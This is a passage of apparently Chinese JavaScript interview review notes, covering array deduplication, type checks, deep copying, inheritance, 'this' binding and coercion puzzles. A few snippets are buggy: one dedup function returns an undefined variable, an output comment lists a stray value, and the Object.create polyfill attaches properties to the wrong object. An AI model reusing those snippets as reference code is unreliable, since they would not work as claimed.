    <content type="text"><![CDATA[测试用例:var arr = [1,1,’true’,’true’,true,true,false,false, undefined,undefined, null,null, NaN, NaN,’NaN’, 0, 0, ‘a’, ‘a’,{},{}] Array.from(new Set(arr)) Set去重（ES6中最常用）// 最简洁，但还无法去掉{}空对象 123var arr1 = Array.from(new Set(arr)) // [1, "true", true, 15, false, undefined, null, NaN, "NaN", 0, "a", &#123;…&#125;, &#123;…&#125;]// 或者var arr1 = [...new Set(arr)] 双层循环和push去重 12345678910111213// 双层循环，外层循环元素，内层循环时比较值。值相同时，则跳过。 function unique(arr) &#123; var array = [] for (var i = 0; i &lt; arr.length; i++) &#123; for (var j = i + 1; j &lt; arr.length; j++) &#123; if (arr[i] === arr[j]) &#123; j = ++i // 不能写成 i++ &#125; &#125; array.push(arr[i]) &#125; return array&#125; 双层循环和splice去重 1234567891011121314// 双层循环，外层循环元素，内层循环时比较值。值相同时，则删去这个值。 此种方法性能最差function removeDuplicates(arr)&#123; var len = arr.length for(var i=0; i&lt;len; i++)&#123; for(var j=i+1; j&lt;len; j++)&#123; if(arr[i]===arr[j])&#123; //第一个等同于第二个，splice方法删除第二个 arr.splice(j, 1) j-- len-- &#125; &#125; &#125; return arr&#125; indexOf去重 1234567891011121314// 新建一个空的结果数组，for 循环原数组，判断结果数组是否存在当前元素，如果有相同的值则跳过，不相同则push进数组。function unique(arr) &#123; if (!Array.isArray(arr)) &#123; throw new Error('type error!') return &#125; var res = [] for (var i = 0; i &lt; arr.length; i++) &#123; if (res.indexOf(arr[i]) === -1) &#123; res.push(arr[i]) &#125; &#125; return array&#125; sort() 123456789101112131415// 利用sort()排序方法，然后根据排序后的结果进行遍历及相邻元素比对。function unique(arr) &#123; if (!Array.isArray(arr)) &#123; throw new Error('type error!') return &#125; arr = arr.sort() var arrry= [arr[0]] for (var i = 1; i &lt; arr.length; i++) &#123; if (arr[i] !== arr[i-1]) &#123; arrry.push(arr[i]) &#125; &#125; return arrry&#125; includes() 12345678910111213// includes() 方法用来判断一个数组是否包含一个指定的值，根据情况，如果包含则返回 true，否则返回false。function unique(arr) &#123; if (!Array.isArray(arr)) &#123; return &#125; var array =[] for(var i = 0; i &lt; arr.length; i++) &#123; if(!array.includes( arr[i])) &#123; array.push(arr[i]) &#125; &#125; return array&#125; hasOwnProperty 1234567// 利用hasOwnProperty 判断是否存在对象属性function unique(arr) &#123; var obj = &#123;&#125; return arr.filter(function(item, index, arr)&#123; return obj.hasOwnProperty(typeof item + item) ? false : (obj[typeof item + item] = true) &#125;)&#125; filter 123456function unique(arr) &#123; return arr.filter(function(item, index, arr)&#123; //当前元素，在原始数组中的第一个索引===当前索引值，否则返回当前元素 return arr.indexOf(item, 0) === index &#125;)&#125; 对象属性不能相同 12345678910 function unique3 (arr) &#123; var obj = &#123;&#125;, array = [] for (var i = 0; i &lt; arr.length; i++) &#123; if (!obj[arr[i]]) &#123; obj[arr[i]] = 1 array.push(arr[i]) &#125; &#125; return array&#125; 递归去重 12345678910111213141516171819function unique(arr) &#123; var array= arr; var len = array.length array.sort(function(a,b)&#123; //排序后更加方便去重 return a - b &#125;) function loop(index)&#123; if(index &gt;= 1)&#123; if(array[index] === array[index-1])&#123; array.splice(index,1); &#125; loop(index - 1) //递归loop，然后数组去重 &#125; &#125; loop(len-1) return array&#125; Map数据结构去重 1234567891011121314// 创建一个空Map数据结构，遍历需要去重的数组，把数组的每一个元素作为key存到Map中。由于Map中不会出现相同的key值，所以最终得到的就是去重后的结果。function unique(arr) &#123; let map = new Map() let array = new Array() // 数组用于返回结果 for (let i = 0; i &lt; arr.length; i++) &#123; if(map.has(arr[i])) &#123; // 如果有该key值 map.set(arr[i], true) &#125; else &#123; map.set(arr[i], false) // 如果没有该key值 array.push(arr[i]) &#125; &#125; return array &#125; reduce 和 includes 123function unique(arr)&#123; return arr.reduce((prev,cur) =&gt; prev.includes(cur) ? prev : [...prev,cur], [])&#125;]]></content>
      <categories>
        <category>Review</category>
      </categories>
      <tags>
        <tag>JS</tag>
        <tag>Review</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[你问我答 JavaScript]]></title>
    <url>%2F2019%2F04%2F10%2FReview%2F%E4%BD%A0%E9%97%AE%E6%88%91%E7%AD%94-JavaScript%2F</url>
    <content type="text"><![CDATA[怎么判断不同的JS数据类型 typeof操作符：返回一个字符串，表示未经计算的操作数的类型。对于基本数据类型（除null外，被认为是一个空的对象引用），返回其本身的数据类型，函数对象返回 function ，其他对象均返回 Object。 instanceof 用来判断A 是否是 B的实例，表达式为 A instanceof B，返回一个Boolean类型的值测试构造函数的prototype属性是否出现在对象的原型链中的任何位置instanceof 检测的是原型,只能用来判断两个对象是否属于实例关系， 而不能判断一个对象实例具体属于哪种类型 123456789instanceof (A,B) = &#123; var L = A.__proto__ var R = B.prototype if(L === R) &#123; // A的内部属性 __proto__ 指向 B 的原型对象 return true; &#125; return false;&#125; Object.prototype.toString 返回当前对象对应的字符串形式。默认情况下返回类型字符串如，Object.prototype.toString.call(true) ; // [object Boolean] 检测一个变量是否为 String 类型 123456789// typeof 并不能判断出所有的 String 变量，无法检测用 new String(str)生成的字符串// new String(str)：当 String() 和运算符 new 一起作为构造函数使用时，它返回一个新创建的 String 对象，存放的是字符串 str 或 str 的字符串表示。// String(str)：当不用 new 运算符调用 String() 时，它只把 str 转换成原始的字符串，并返回转换后的值。function isString(str) &#123; // null 和 undefined 没有 constructor 属性 if(str === null || str === undefined) &#123; return false &#125; return (str.constructor === String)&#125; 如何判断Javascript对象是否存在 12345678// 适用于两种情况: x 从来没有出现过；x 只是用var声明了，但没有赋值if (typeof(x) == 'undefined') &#123; console.log('对象不存在')&#125;// JavaScript 遇到预期为布尔值的地方（比如if语句的条件部分），就会将非布尔值的参数自动转换为布尔值。系统内部会自动调用Boolean函数。// 如果 x 不存在（未声明）则会出错。 "", 0, NaN, null, undefined, false 作为if的条件的时候，被认为是falseif (x) &#123; //... &#125; 怎么实现对对象的拷贝(浅拷贝与深拷贝) 浅拷贝。 拷贝原对象的引用，复制引用（指针），而未复制真正的值，改变原对象以后，新对象跟着改变。var obj1 = obj2 赋值运算符=Array.prototype.slice()Array.prototype.concat()Object.assign() 只拷贝对象自身的可枚举的属性 深拷贝JSON.parse(JSON.stringify(obj))。 复合类型的值只能是数组或对象，不能是函数、正则、日期对象，也不能是undefined展开运算符… 取出参数对象的所有可遍历属性，拷贝到当前对象之中immutable 改变新的对象不会改变原对象，在大量深拷贝操作中显著地减少性能消耗递归来实现每一层都重新创建对象并赋值，真正意义上的深拷贝 1234567891011121314function deepClone(source)&#123; const targetObj = source.constructor === Array ? [] : &#123;&#125;; // 判断复制的目标是数组还是对象 for(let keys in source)&#123; // 遍历目标 if(source.hasOwnProperty(keys))&#123; if(source[keys] &amp;&amp; typeof source[keys] === 'object')&#123; // 如果值是对象，就递归一下 targetObj[keys] = source[keys].constructor === Array ? [] : &#123;&#125;; targetObj[keys] = deepClone(source[keys]); &#125;else&#123; // 如果不是，就直接赋值 targetObj[keys] = source[keys]; &#125; &#125; &#125; return targetObj;&#125; JavaScript 如何实现继承JavaScript语言不像面向对象的编程语言中有类的概念，所以也就没有类之间直接的继承，JavaScript中只有对象，使用函数模拟类，基于对象之间的原型链来实现继承关系，ES6的语法中新增了class关键字，但也只是语法糖，内部还是通过函数和原型链来对类和继承进行实现。 原型链继承最简单的继承实现方式。来自原型对象的所有属性被所有实例共享；创建子类实例时，无法向父类构造函数传参；原型链继承多个实例的引用类型属性指向相同，存在篡改的可能；为子类新增属性和方法，必须要在new语句之后执行，不能放到构造器中。 1234function Animal() &#123;&#125;Animal.prototype.name = 'cat'Animal.prototype.say = function() &#123;console.log('hello')&#125;var cat = new Animal() 构造继承使用call或apply方法，将父对象的构造函数绑定在子对象上. 12345678910function Animal() &#123; this.species = "动物"&#125;function Cat(name, age) &#123; Animal.call(this) this.name = name this.age = age&#125;var cat = new Cat('汤姆', 2) 组合继承 12345678910111213function Animal() &#123; this.species = "动物"&#125;function Cat(name)&#123; Animal.call(this) this.name = name&#125;Cat.prototype = new Animal() // 重写原型Cat.prototype.constructor = Cat// 如果没有Cat.prototype = new Animal()这一行，Cat.prototype.constructor是指向Cat的；// 加了这一行以后，Cat.prototype.constructor指向Animal.这显然会导致继承链的紊乱，因此必须手动纠正，将Cat.prototype对象的constructor值改为Cat extends 继承ES6新增继承方式，Class 可以通过extends关键字实现继承 12345678910class Animal &#123; &#125;class Cat extends Animal &#123; constructor() &#123; super(); // 相当于 Animal.prototype.constructor.call(this) &#125;&#125;// 使用 extends 实现继承，必须添加 super 关键字定义子类的 constructor new 操作符具体干了什么 123456789101112131415161718192021222324var Foo = function () &#123; &#125;var foo = new Foo() // 创建了一个新的空对象var obj = new Object() // 设置原型链。将该空对象obj的 __proto__指向构造函数的原型obj.__proto__ = Foo.prototype // 或者 Object.setPrototypeOf(obj, Foo.prototype)// 以该对象为上下文执行构造函数。 让Foo中的this指向新创建的obj对象，并执行Foo的函数体，属性和方法被加入到 this 引用的对象中var result = Foo.call(obj) // 判断Foo的返回值类型，返回。如果有 return 出来东西是引用类型(对象)的话就直接返回 return 的内容，没有的话就返回创建的这个对象return typeof result === 'object' ? result : obj // 用代码表示function NewFunc(func)&#123; var ret = &#123;&#125;; if (func.prototype !== null) &#123; ret.__proto__ = func.prototype &#125; var ret1 = func.apply(ret, Array.prototype.slice.call(arguments, 1)) if ((typeof ret1 === "object" || typeof ret1 === "function") &amp;&amp; ret1 !== null)&#123; return ret1 &#125; return ret&#125; Object.create() 如何实现的 123456789101112// object.create(proto, properties) 使用指定的原型对象及额外的属性去创建一个新的对象Object.create = function (obj, properties) &#123; var F = function () &#123;&#125; F.prototype = obj if (properties) &#123; Object.defineProperties(F, properties) &#125; return new F()&#125;Object.create(&#123;&#125;, &#123;a: &#123;value: 1&#125;&#125;) // &#123;a: 1&#125;// Object.cerate()必须接收一个对象参数；可以通过 Object.create(null) 创建一个干净的对象，也就是没有原型 判断回文字符串 123456789101112131415161718192021222324252627282930313233343536373839404142434445// reversefunction Palindromes(str) &#123; let reg = /[\W_]/g // \w 匹配所有字母和数字以及下划线； \W与之相反； [\W_] 表示匹配下划线或者所有非字母非数字中的任意一个；/g全局匹配 let newStr = str.replace(reg, '').toLowerCase() let reverseStr = newStr.split('').reverse().join('') return reverseStr === newStr // 与 newStr 对比&#125;// for 循环// 写法一function Palindromes(str) &#123; let reg = /[\W_]/g let newStr = str.replace(reg, '').toLowerCase() for(let i = 0, len = Math.floor(newStr.length / 2); i &lt; len; i++) &#123; if(newStr[i] !== newStr[newStr.length - 1 - i]) return false &#125; return true&#125;// 写法二function Palindromes(str) &#123; let reg = /[\W_]/g let newStr = str.replace(reg, '').toLowerCase(); let len = newStr.length for(let i = 0, j = len - 1; i &lt; j; i++, j--) &#123; if(newStr[i] !== newStr[j]) return false &#125; return true&#125;// 递归function palin(str) &#123; let reg = /[\W_]/g let newStr = str.replace(reg, '').toLowerCase() let len = newStr.length while(len &gt;= 1) &#123; if(newStr[0] != newStr[len - 1]) &#123; // len = 0 // 为了终止while循环 否则会陷入死循环 return false &#125; else &#123; return palin(newStr.slice(1, len - 1)); // 截掉收尾字符 再次比较收尾字符是否相等，直到字符串剩下一个字符（奇数项）或者 0 个字符（偶数项） &#125; &#125; return true&#125; 求 a[b] 的值。对象键名称只能是字符串。 12345678910var a=&#123;&#125;, b=&#123;key:'b'&#125;, c=&#123;key:'c'&#125; a[b]=123a[c]=456console.log(a[b]) // 456// 因为键名称只能是字符串，b、c单做键会调用toString()方法，得到的都是[object Object]。a[b]和a[c]都等价于a["[object Object]"]。// 如果采用a.b和a.c的方式赋值，会把b和c这两个字符作为字段进行处理a.b = 123a.c = 456console.log(a) // &#123;b: 123, c: 456&#125; this 指向 123456789101112131415161718var hero = &#123; _name: 'John Doe', getSecretIdentity: function ()&#123; return this._name &#125;&#125;var stoleSecretIdentity = hero.getSecretIdentityconsole.log(stoleSecretIdentity()) // undefinedconsole.log(hero.getSecretIdentity()) // "John Doe"// 将 getSecretIdentity 赋给 stoleSecretIdentity，等价于定义了 stoleSecretIdentity 函数：var stoleSecretIdentity = function ()&#123; return this._name&#125;// stoleSecretIdentity 的上下文是全局环境，所以第一个输出 undefined。可通过 call 、apply 和 bind 等方式改变 stoleSecretIdentity 的this 指向。// 第二个是调用对象的方法，输出 "John Doe"。 给你一个 DOM 元素，创建一个能访问该元素所有子元素的函数，并且要将每个子元素传递给指定的回调函数。 12345678// 利用 深度优先搜索(Depth-First-Search) 实现function Traverse(ele, cb) &#123; cb(ele) var list = ele.children for (var i = 0; i &lt; list.length; i++) &#123; Traverse(list[i], cb) &#125;&#125; 判断字符串中出现次数最多的字符及出现的次数 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778// 方法一：利用json数据个数“键”唯一的特性function getMostChart(str) &#123; //定义一个json对象用于保存str的每一项以及出现次数。 var json = &#123;&#125; //遍历str,循环其中的每一个字符，将某个字符的值及出现的个数拿出来作为json的key和value for(var i=0; i&lt;str.length; i++)&#123; //判断json中是否有当前str的值 if(!json[str.charAt(i)]) &#123; //如果不存在 就将当前值添加到json中去，并设置1 json[str.charAt(i)] = 1 &#125; else &#123; //如果存在的话就让数组中已有的当前值的value值++ json[str.charAt(i)] ++ &#125; &#125; //存储出现次数最多的值和次数 var number = '', num = 0 //遍历json 使用打擂算法统计需要的值 for(var k in json) &#123; //如果当前项大于下一项 if (json[k]&gt;num) &#123; //就让当前值更改为出现最多次数的值 num = json[k] number = k &#125; &#125; return &#123; number, num &#125;&#125;// 利用数组reduce()方法 同时应用一个函数针对数组的两个值(从左到右)function getMostChart(str) &#123; //定义一个json对象用于保存str的每一项以及出现次数 var json = str.split('').reduce((acc, cur) =&gt; (acc[cur]++ || (acc[cur] = 1), acc), &#123;&#125;) //存储出现次数最多的值和次数 var number = '', num = 0 //遍历json 使用打擂算法统计需要的值 for(var k in json)&#123; //如果当前项大于下一项 if (json[k]&gt;num) &#123; //就让当前值更改为出现最多次数的值 num = json[k] number = k &#125; &#125; return &#123; number, num &#125;&#125;// 利用正则表达式的replace对str的每一项进行检测function getMostChart(str)&#123; var json = &#123;&#125; str.replace(/(\w&#123;1&#125;)/g,function($1) &#123; json[$1] ? json[$1]+=1 : json[$1] = 1 &#125;) //存储出现次数最多的值和次数 var number = '', num = 0 //遍历json 使用打擂算法统计需要的值 for(var k in json)&#123; //如果当前项大于下一项 if (json[k]&gt;num) &#123; //就让当前值更改为出现最多次数的值 num = json[k] number = k &#125; &#125; return &#123; number, num &#125;&#125; this 指向 普通函数（非箭头函数）被调用时（即运行时）才会确定该函数内this的指向。 箭头函数中的this在函数定义的时候就已经确定，它this指向的是它的外层作用域this的指向。 要确定函数中this的指向，必须先找到该函数被调用的位置。 可以理解成 this 就是 call 一个函数时，传入的第一个参数，其他形式都是它的语法糖，可按照 转换代码 将其转换为call形式 func.call(context, p1, p2)123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117// 第一种 fn() 普通全局函数 形式var a = 1function fn () &#123; console.log(this.a)&#125;fn() // 1// 非严格模式下，直接不带任何引用形式去调用函数，则this会指向全局对象。因为没有其他影响去改变this，this默认就是指向全局对象（浏览器window，Node中是global）// 严格模式下，这个this其实是undefined的// 第二种 obj.fn() 作为对象属性被调用 形式var a = 1function fn () &#123; console.log(this.a)&#125;var obj = &#123; a: 2, fn&#125;obj.fn() // 2// 这种形式对比起第一种，很明显fn()已经是名花有主的了！看清楚，是谁呼唤的fn()？没错，就是obj，所以this的指向就不言而喻了。一句话，谁去调用这个函数的，这个函数中的this就绑定到谁身上。var a = 1function fn () &#123; console.log(this.a)&#125;var obj = &#123; a: 2, fn&#125;var obj0 = &#123; a: 3, obj &#125;obj0.obj.fn() // 2// 即使是这种串串烧的形式，结果也是一样的，test()中的this只对直属上司（直接调用者obj）负责var a = 1function fn () &#123; console.log(this.a)&#125;var obj = &#123; a: 2, fn&#125;var testCopy = obj.fntestCopy() // 1 // 不管是不是在函数内部，只要是在全局环境下运行，this就是指顶层对象window。var a = 1function fn () &#123; console.log(this.a)&#125;var obj = &#123; a: 2, fn&#125;setTimeout(obj.fn) // 1// window.setTimeout()和window.setInterval() 里面的this默认是window对象// 第三种 o.call(obj)、o.apply(obj) 、o.bind(obj) 形式var a = 1function fn () &#123; console.log(this.a)&#125;var obj = &#123; a: 2, fn&#125;var testCopy = obj.fntestCopy.call(obj) // 2// call方法可以改变this的指向，指定this指向对象obj，然后在对象obj的作用域中运行函数。// call方法的参数，应该是一个对象。如果参数为空、null和undefined，则默认传入全局对象。如果call方法的参数是一个原始值，那么这个原始值会自动转成对应的包装对象，然后传入call方法// 第四种 new fn() 构造函数 形式var a = 1function fn (a) &#123; this.a = a&#125;var b = new fn(2)console.log(b.a) // 2// 构造函数中的this，指的是被new出来的实例对象// 第五种 箭头函数 形式// 箭头函数的this，总是指向定义时所在的对象，而不是运行时所在的对象var a = 1var fn = () =&gt; &#123; console.log(this.a)&#125;var obj = &#123; a: 2, fn&#125;obj.fn() // 1 // 箭头函数不会创建自己的this，箭头函数中的this在函数定义的时候就已经确定(继承自父执行上下文中的this)，而不是在执行函数的时候绑定。它this指向的是它的外层作用域this的指向。 箭头函数不能用call方法修改里面的this.var x = 11var obj= &#123; x: 22, say: ()=&gt;&#123; console.log(this.x) &#125;&#125;obj.say() // 11// 箭头函数本身所在的对象为obj，而obj的父执行上下文就是window，因此这里的this.x实际上表示的是window.x function foo() &#123; setTimeout( () =&gt; &#123; console.log("id:", this.id) &#125;, 100)&#125;var id = 21 // 箭头函数运行时所在的环境foo.call(&#123; id: 42 &#125;) // 42 箭头函数定义时所在的环境// 箭头函数位于foo函数内部。只有foo函数运行(被调用)后，它才会按照定义生成，所以foo运行时所在的对象，恰好是箭头函数定义时所在的对象。 写一个mul函数，使用方法如下console.log(mul(2)(3)(4)); // 24console.log(mul(4)(3)(4)); // 48 123456789// 返回一个匿名函数，运行这个匿名函数又返回一个匿名函数，最里面的匿名函数可以访问 x,y,z 进而算出乘积返回即可function mul (x) &#123; return function (y) &#123; return function (z) &#123; return x * y * z &#125; &#125;&#125;// 函数是一等公民；函数可以有属性，并且能连接到它的构造方法；函数可以像一个变量一样存在内存中；函数可以当做参数传给其他函数；函数可以返回其他函数 forEach、for in、for of、Object.keys 的区别 forEach 数组的方法，遍历数组，按升序为数组中含有效值的每一项执行一次callback 函数，那些已删除或者未初始化的项将被跳过。三个形参分别代表当前的值、当前的索引、数组本身。总是返回undefined，不能使用continue、break退出循环，不能使用return返回到外层。并且不可链式调用，典型用例是在一个链的最后执行副作用。 123arr.forEach((currentValue, index, arr)=&gt;&#123; // ...&#125;) for in 以随机顺序遍历对象及原型链上的可枚举属性(键名)只遍历可枚举属性会遍历自定义、原型链上的属性，若只遍历自身可用 hasOwnProperty() 判断遍历对象返回的属性名和遍历数组返回的index索引值都是字符串类型不推荐在数组中使用 for in 遍历 12345678910111213141516171819202122for (let key in obj) &#123; if(obj.hasOwnProperty(key)) &#123; // console.log(obj[key]) &#125;&#125;// 举例Array.prototype.getLength = function() &#123; return this.length&#125;var arr = ['a', 'b', 'c']arr.name = 'June'Object.defineProperty(arr, 'age', &#123; enumerable: true, value: 17, writable: true, configurable: true&#125;)for(var i in arr) &#123; console.log(i) // 0, 1, 2, name, age, getLength&#125; for of 遍历可迭代对象自身的可迭代属性，并为每个不同属性值(键值)执行语句可用于包括 Array、Map、Set、String、arguments、DOM NodeList对象 类似数组的对象等 的 可迭代对象，不支持普通对象不会遍历到原型链上的属性可以由break, continue、throw 或return终止迭代器可搭配实例方法 entries()，同时输出数组的内容和索引； 1234567891011121314for (let val of obj) &#123; // console.log(val)&#125;// 举例var obj = &#123;name: 'June', age: 17, city: 'guangzhou'&#125;;for(let [key, value] of Object.entries(obj)) &#123; console.log(key, ':', value) // name:June, age:17, city:guangzhou&#125;// Object.entries(obj)：如果参数的数据结构具有键和值，则返回一个二元数组，数组的每个元素为参数的[key,value]数组，但Symbol 属性会被忽略Object.entries(&#123; [Symbol()]: 123, name: 'June', age: 17&#125;)// [['name','June'], ['age', 17]] Object.keys返回对象自身可枚举属性组成的数组不会遍历对象原型链上的属性以及 Symbol 属性对数组的遍历顺序和 for in 一致 12345678910111213141516// 举例function Person() &#123; this.name = 'June'&#125;Person.prototype.getName = function() &#123; return this.name&#125;var person = new Person();Object.defineProperty(person, 'age', &#123; enumerable: true, value: 17, writable: true, configurable: true&#125;)Object.keys(person) // ['name', 'age'] 优先查找局部变量，再查找全局变量 123456789101112131415161718192021var name = 'World!';(function () &#123; // var name; // 相当于 console.log( name); if (typeof name === 'undefined') &#123; var name = 'Jack'; console.log('Goodbye ' + name); &#125; else &#123; console.log('Hello ' + name); &#125;&#125;)();// 函数会首先搜索函数内部的变量，因为var变量名提升，所以它能找到name，但此时代码还没有运行到赋值那一步，所以name是undefined。// 结果： Goodbye Jackvar name = 'World!';(function () &#123; console.log( name);&#125;)();// js局部变量和全局变量，优先查找局部变量。当函数内部未找到此变量声明或定义时就会再去向外部寻找。// 结果：World! map() 和 parseInt() 123456789101112131415161718192021222324252627282930313233["1", "2", "3"].map(parseInt);// 解析arr.map(function callback(currentValue[, index[, array]]) &#123; // ...&#125;[, thisArg])// map接受两个参数, 一个回调函数 callback, 一个回调函数的this值。其中回调函数接受三个参数 currentValue, index, arraryparseInt(string, radix)// string 要被解析的字符串。 如果不是字符串会被转换，忽视空格符// 基数 radix(可选). 表示要解析的数字的基数。介于 2 ~ 36 之间// 如果省略 radix 参数或其值为 0，parseInt会根据string来判断数字的基数，默认以 10 为基础来解析// 如果 string 以 “0x” 或 “0X” 开头，parseInt() 会把 string 的其余部分解析为十六进制的整数// 如果 string 以 0 开头，parseInt() 将把它解析为十进制的整数// 如果 string 以 1-9 的数字开头，parseInt() 将把它解析为十进制的整数// 如果 radix 参数小于 2 或者大于 36，则 parseInt() 将返回 NaN// 当string无法转成radix进制数时会返回NaN。// map只传入了回调函数 parseInt, 回调函数的参数index索引值作了parseInt的基数radix，导致出现超范围的radix赋值和不合法的进制解析，因此返回NaN// 可以用重新定义parseInt，来检验var parseInt = function (string, radix) &#123; return string + '-' + radix;&#125;;['1','2','3'].map(parseInt);// 得到["1-0", "2-1", "3-2"]// 所以，本题即问// parseInt('1', 0); // radix=0,以10为基数解析// parseInt('2', 1); // radix=1&lt;2,返回NaN// parseInt('3', 2); // 3无法转成二进制// 结果: [1, NaN, NaN] 函数的原型和它的prototype属性无关 12345678function f() &#123;&#125;var a = f.prototypevar b = Object.getPrototypeOf(f)a === b// 用new创建f的实例的原型指向 f.prototype，即 f.prototype == Object.getPrototypeOf(new f())// Object.getPrototypeOf(f)是 f 函数的原型，即 Function.prototype === Object.getPrototypeOf(f)// 答案: false 函数声明优先级高于变量声明 1234567function a(x) &#123; return x * 2&#125;var aconsole.log(a)// 函数声明优先级高于变量声明。js按从上到下执行，相当于先声明了一个函数a，再声明了一个变量a，但此变量没有赋值，因此不会覆盖，故打印出函数体a. 如果改为 var a = 1, 那么结果为1. call() 参数为空、null或undefined，默认为全局变量。alert会调用toString()方法 1234567function a() &#123; alert(this)&#125;a.call(null)// call() 参数为空、null或undefined，默认为全局变量。浏览器为window// alert会调用toString()方法,结果为[object Window]。 若alert改为console,则为Window delete 用删除对象属性 123456(function(x)&#123; delete x return x&#125;)(1)// delete 用删除对象属性，不能删除函数中传递的参数 闭包 123456789101112131415161718var name = "The Window"; var object = &#123; name : "My Object", getNameFunc: function()&#123; return function()&#123; return this.name; &#125;; &#125;, getName:function()&#123; return this.name; &#125; &#125;;console.log(object.getNameFunc()()); // The Windowconsole.log(object.getName()); // My Object// 并没有令Object调用包含this的匿名函数，而是让它调用了返回匿名函数的函数，然后将匿名函数暴露在全局环境下再调用，这时候调用匿名函数的就成了window，所以this指向window对象而不是Object// 闭包始终取得值都是其父级活动对象中的值，如果活动对象没有特别定义this的话，就始终往上找！别看在object对象内有一个name属性，但是它不在闭包父级得活动对象中，所以接着往上找直到window的name 深拷贝递归 123456789101112131415161718function deepClone (source) &#123; var target if (typeof source === 'object') &#123; target = Array.isArray(source) ? [] : &#123;&#125; for (var key in source) &#123; if (source.hasOwnProperty(key)) &#123; if (typeof source[key] !== 'object') &#123; target[key] = source[key] &#125; else &#123; target[key] = deepClone(source[key]) &#125; &#125; &#125; &#125; else &#123; target = source &#125; return target&#125; get/set 与原型链如果对象 obj 没有 z 属性，并且原型链上有对应的 get/set 方法，当尝试给 obj 赋值时，会走原型上的 get/set 方法，而不会给当前 obj 对象添加新属性。 12345678910111213141516171819function foo() &#123;&#125;Object.defineProperty(foo.prototype,'z',&#123; get: function()&#123; return 1 &#125; &#125;)var obj = new foo() // var obj = Object.create(foo) 也是一样的效果foo // ƒ foo() &#123;&#125;obj // foo &#123;&#125;obj.z // 1obj.z = 2 obj // foo &#123;&#125;obj.z // 1// 若要给 obj 添加新属性 zObject.defineProperty(obj, 'z', &#123; value: 3, configurable: true &#125;)obj // foo &#123;z: 3&#125;obj.z // 3delete obj.z // trueobj.z // 1]]></content>
      <categories>
        <category>Review</category>
      </categories>
      <tags>
        <tag>JS</tag>
        <tag>Review</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[你问我答 强制类型转及运算]]></title>
    <url>%2F2019%2F04%2F10%2FReview%2F%E4%BD%A0%E9%97%AE%E6%88%91%E7%AD%94-%E5%BC%BA%E5%88%B6%E7%B1%BB%E5%9E%8B%E8%BD%AC%E5%8F%8A%E8%BF%90%E7%AE%97%2F</url>
    <content type="text"><![CDATA[下面的代码运行结果是什么 123456789101112131415161718192021console.log(1 + "2" + "2"); // 122// 1 + "2" 是执行的第一个操作。由于其中一个运算对象 "2" 是字符串，JavaScript会假设它需要执行字符串连接，因此，会将 1 的类转换为 "1" ， 1+"2" 结果就是 "12" 。然后， "12"+"2" 就是 "122" 。console.log(1 + +"2" + "2"); // 32// 根据运算的顺序，要执行的第一个运算是 +"2" （第一个 "2" 前面的额外 + 被视为一元运算符）。因此，JavaScript将 "2" 的类型转换为数字，然后应用一元 + 号（即将其视为一个正数）。其结果就是得到一个数字 2 ，接下来的运算就是 1 + 2 ，这当然是 3。console.log(1 + -"1" + "2"); // 02// 这里的解释和前一个例子相同，不同的地方是此处的一元运算符是 - 而不是 + 。先是 "1" 变为 1 ，然后当应用 - 时又变为了 -1 ，然后将其与 1 相加，结果为 0 ，再将其转换为字符串，连接最后的 "2" 运算对象，得到 "02" 。console.log(+"1" + "1" + "2"); // 112// 虽然第一个运算对象 "1" 因为前缀的一元 + 运算符类型转换为数值，但当连接到第二个运算对象 "1" 的时候，又立即转换回字符串，然后又和最后的运算对象 "2" 连接，产生了字符串 "112" 。console.log( "A" - "B" + "2"); // NaN2// 由于运算符 - 不能被应用于字符串，并且 "A" 和 "B" 都不能转换成数值，因此， "A" - "B" 的结果是 NaN ，然后再和字符串 "2" 连接，得到 "NaN2" console.log( "A" - "B" + 2); // NaN// 参见前一个例子， "A" - "B" 结果为 NaN 。但是，应用任何运算符到 NaN 与其他任何的数字运算对象，结果仍然是 NaN 。 ({}+{}).length 123456解析：1、数+数 = 数（int float）2、数+null = 数3、数+其他数据类型 = string （强制转换成string 再相加）4、其他数据类型 + 其他数据类型 = string(强制转换成string 再相加)答案：(&#123;&#125;+&#123;&#125;).length 等价于 (&#123;&#125;.toString() + &#123;&#125;.toString()).length，&#123;&#125;.toString()的值为[object Object]，所以最后结果为30。 设置对象的属性会字符串化参数值 1234567var a=&#123;&#125;, b=&#123;key:'b'&#125;, c=&#123;key:'c'&#125;;a[b]=123;a[c]=456;console.log(a[b]); // 456// JavaScript在设置对象的属性的时候，会暗中字符串化参数值。在这里例子中，由于 b 和 c都是对象，把它们设置为对象a的参数，它们都将被转换为 "[object Object]" 。结果就是， a[b] 和 a[c] 都相当 "[object Object]" ，而后者会将前者的值覆盖。因此，设置或引用 a[c] 和设置或引用 a[b] 完全相同。所以得到的答案是 456 。 运算顺序和强制类型转换 123[1 &lt; 2 &lt; 3, 3 &lt; 2 &lt; 1]// 大于、小于都是从左往右运算。1 &lt; 2 为 true， true再强制转换为 1， 1 &lt; 3 为true。 同理 3 &lt; 2 为 false， false再强制转换为 0， 0 &lt; 1 为true。 答案为 [true, true]。 双等号 == 运算规则 1234567891011121314var a = [0];if ([0]) &#123; console.log(a == true);&#125; else &#123; console.log("wut");&#125;// 解析// Boolean() 它的转换规则相对简单：除了 "", 0, NaN, null, undefined, false 几个值的转换结果为false，其他的值全部为true。所有对象（包括空对象）的布尔值都是true。// if([0]) 等效于 if(Boolean([0]))。 Boolean([0]) === true// [0] =&gt; [0].valueOf() =&gt; [0] 不是基本类型=&gt; [0].toSrting() =&gt; '0' =&gt; Number('0') =&gt; 0// true =&gt; 1// 0 !== 1 undefined == null，结果是true。且它俩与所有其他值比较的结果都是falseString == Boolean，需要两个操作数同时转为NumberString/Boolean == Number，需要String/Boolean转为NumberObject == Primitive，需要Object转为Primitive(具体通过valueOf和toString方法) 参考: https://zhuanlan.zhihu.com/p/21650547 JS值的最值范围 12345678var a = 111111111111111110000, b = 1111a + b// 由于JavaScript实际上只有一种数字形式IEEE 754标准的64位双精度浮点数，其所能表示的整数范围为[-(2^53 - 1) ~ 2^53 - 1]。// 这里的111111111111111110000已经超过了2^53次方，所以会发生精度丢失的情况。最大值与其他值相加后仍未最大值。// 最大值 Number.MAX_SAFE_INTEGER === Math.pow(2, 53) - 1 === 2**53 - 1 === 9007199254740991// 最小值 Number.MIN_SAFE_INTEGER === 